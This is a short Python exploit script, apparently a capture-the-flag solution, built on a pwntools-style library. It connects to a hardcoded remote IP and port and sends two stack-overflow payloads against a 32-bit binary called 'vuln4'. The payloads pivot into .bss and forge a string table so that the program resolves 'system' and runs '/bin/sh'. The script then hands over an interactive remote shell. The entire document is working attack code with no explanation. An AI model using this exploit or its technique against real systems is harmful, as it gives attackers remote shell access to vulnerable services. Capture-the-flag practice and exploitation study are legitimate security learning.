from ntpwn import *

s = remote('213.233.161.38', 4801)
l = ELF('./libc.so.6')
e = ELF('./vuln4')

pr = 0x080485db
strtab = 0x80497B0 + 4
bss = 0x80498b0
fgets_main = 0x0804852c

payload = 'A' * 18 + p32(bss + 0x3a)
payload += p32(fgets_main)
s.sendlineafter('self\n',payload)

pause()
payload2 = 'B' * 18 + p32(0x80498d2-4)
payload2 += p32(0x80484db) + p32(strtab) + p32(0x80498e1 + 112)
payload2 += p32(e.plt['fflush'] + 6) + 'AAAA' + p32(0x80498e1-8+112)
payload2 += 'A' * 100
payload2 += 'system\x00/bin/sh\x00'
payload2 += p32(bss+8+112) + "\x06" + "\x00" * 3
s.sendline(payload2)

s.interactive()
